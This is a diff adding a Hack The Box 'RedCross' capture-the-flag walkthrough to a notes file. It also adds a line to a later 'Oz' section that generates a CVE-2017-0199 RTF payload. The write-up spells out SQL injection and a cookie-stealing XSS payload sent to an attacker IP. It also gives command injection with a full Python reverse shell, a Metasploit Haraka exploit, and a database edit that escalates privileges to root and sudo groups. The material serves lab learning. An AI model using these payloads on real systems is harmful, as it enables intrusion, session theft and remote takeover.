@@ -1,3 +1,142 @@
+HTB REDCROSS
+Nmap show us this ports
+80
+443
+22
+ 
+Doing dirb shows us:
+Seems like nothing tried with a bunch of dics dirbuster and dirb nothing so far
+ 
+so we see the host its intra.redcross.htb its a subdomain so we can stark looking for another subdomains i use wfuzz for this task:
+ 
+wfuzz -c -z file,/root/SecLists/Discovery/DNS/subdomains-top1mil-20000.txt -Z --hc XXX -u http://FUZZ.redcross.htb
+ 
+SEEMS not working too
+ 
+Now trying again with dirbuster and medium list with recursive dirs and files and extension php pdf txt and html
+manage to found a interesting pdf.
+ 
+Its says you have to send a requet in the contact forms for credentials
+ 
+Subject: credentials
+main field:
+"username=any""
+email
+ 
+when we send the request a message appears to use guest:guest as login because of times for proccessing the request.
+ 
+Once logged in capturing the request wiht burp shows us a hidden parameter o=query&
+ 
+trying for sqli adding a simple ' we trigger an error.
+ 
+Trying with differents kind of symbols manage to find this %
+when injected we can see all messages from users:
+ 
+admin subd webapp problems (priority) [6]
+From: penelope (uid 2)  To: charles (uid 3)
+ 
+Hi, Yes it's strange because we applied some input filtering on the contact form. Let me check it. I'll take care of that since now! KR
+ 
+Its another subdomain admin so we add to /etc/host and another login page.
+ 
+Now we can capture burp request save it and try sqlmap -r request
+ 
+And then we can see dbs users etc:
+ 
+ 
+Now trying with xss on contac form we manage to found email field its vulnerable so we can try this
+ 
+Start python http.server on attack
+ 
+Request
+ 
+username=whatever
+ 
+Enter this in the bottom box for email field
+<script>new Image().src="http://10.10.15.84:8000/"+document.cookie;</script>
+ 
+We should get our cookie.
+On admin.redcross.htb
+ 
+pst5us8nd2f537toof73ksrr92
+ 
+Now on firefox we can try edit cookie and put the cookie value on it you should be able to login to the admin panel
+Now next its simple create a user copy the pass and whitelist you ip then login to ssh.
+ 
+And we are in. But this a jail.
+ 
+Now on admin it panel i managed to find when we send a request for deny a ip with burp theres a ip parameter trying to inject commands on it with ; we can get a reverse shell:
+ 
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.84",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+ 
+And we now have a reverse shell with www-data
+ 
+Another method its when we whitelist our ip we can do nmap again and found this ports open
+ 
+1025 haraka 2.8.8
+5432 postgresql
+   
+Now searching for xploit i found msf one
+use exploit/linux/smtp/haraka
+configuring correctly with correct emails:
+ 
+admin@redcross.htb
+penelope@redcross.htb
+ 
+and set payload to linux/x64/shell_reverse_tcp
+ 
+we manage to get ourselves a shell and now we can cat the user.txt
+ac899bd46f7b014a369fbb60e53329bf
+ 
+Now searching for priv escalatin i managed to find /var/www/html/admin
+ 
+in there is a file containing users and password for the postgresql db:
+ 
+psql -d unix -U unixusrmgr -h localhost -W
+PASSWORD:    aXwrtUO9_aa&
+             dheu%7wjx8B&
+Now searching for the databases with \l
+now we can view there are four tables only have acces to passwd_table we can see their schema with
+\d+ passwd_table
+and show all tables with \dt
+now we can create a user from admin panel and copy password
+now from psql we can edit their properties
+ 
+update passwd_table set gid=0 where gid=yourusergid
+update passwd_table set homedir='/root' where homedir='/var/jail/home''
+ 
+Alternate we can create a user of our own from psql
+as show in actions.php file
+insert into passwd_table (username, passwd, gid, homedir) values ($1, $2, 1001, '/var/jail/home')");
+ 
+ 
+insert into passwd_table (username, passwd, gid, homedir) values (yourvalues)
+ 
+now we can login with ssh and got gid(root) group(root) but uid(not root)
+we have to find a way
+ 
+Now digging through all the posibilities to get root
+ 
+ret2libc, phantom, xss, postgresql, etc
+ 
+i found another one reading on /etc/group file i realize i could add my user to sudo group as i already know my password.
+ 
+So from ssh shell i go again to psql> and run this command to make me sudo group
+ 
+update passwd_table set gid=27(sudo group) where username='myuser''
+ 
+now wait for db to update the values and then log out and in from ssh you should now be sudo group.
+ 
+Now we can try to execute:
+ 
+sudo cat /root/root.txt
+ 
+and we got root flag:
+ 
+892a1f4d018e5d382c4f5ee1b26717a4
+ 
+*****************************************************
+ 
 HTB OZ
 First enumerations on nmap result with intense scan plus upd we found:
  
@@ -186,6 +325,7 @@ But first we have to convert this file we are storing in our local server as RTF
 https://github.com/bhdresh/CVE-2017-0199/blob/master/cve-2017-0199_toolkit.py
 Now running this command should give us as output the Invoice2.rtf file that we need to send as attachment in alpine email client.
 python toolkit.py -w Invoice2.rtf -t RTF -M gen -u
+python toolkit.py -M gen -t RTF -w Invoice.rtf -u http://192.168.56.1/logo.doc
  
 Once we have sent the email and having our msfconsole module running and listeneing on payload port we should receive a meterpreter session as htb\nico.
 port 3487  
